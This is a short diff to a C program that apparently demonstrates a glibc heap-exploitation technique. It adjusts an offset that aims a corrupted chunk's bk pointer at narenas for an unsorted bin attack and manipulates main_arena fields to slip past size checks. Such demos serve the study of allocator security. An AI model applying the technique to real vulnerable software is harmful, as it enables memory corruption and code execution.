@@ -269,7 +269,7 @@ int main(void) {
      * set INTM's bk to narenas-0x10. This will
      * be our target for the unsorted bin attack.
      * */
-    *((uint64_t*) (INTM + 0x8)) = leak - 0xa20;
+    *((uint64_t*) (INTM + 0x8)) = leak - 0xa40;
 
     printf("...and then manipulate the main_arena.system_mem field in order to pass the\n");
     printf("size sanity checks for the chunk overlapping the main-arena.\n\n");
